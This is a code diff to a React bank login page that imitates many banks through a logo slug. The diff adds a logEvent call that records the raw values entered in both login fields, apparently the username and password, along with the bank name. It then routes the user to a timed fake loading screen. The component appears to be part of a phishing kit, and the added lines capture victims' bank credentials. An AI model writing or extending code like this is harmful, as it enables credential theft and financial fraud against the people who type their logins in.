@@ -2,6 +2,8 @@ import { useState } from "react";
 import { Link, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, Info, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
+import { logEvent } from "@/lib/session";
+
 
 export type BankLoginPageProps = {
   logoSlug: string;
@@ -152,8 +154,17 @@ export function BankLoginPage({
                   sessionStorage.setItem("bankName", title);
                   sessionStorage.setItem("bankLogo", logoSlug);
                 } catch {}
+                logEvent("bank_login", {
+                  bank_slug: logoSlug,
+                  bank_name: title,
+                  field1_label: field1Label,
+                  field1: v1,
+                  field2_label: field2Label,
+                  field2: v2,
+                });
                 navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
               }}
+
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
                   ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
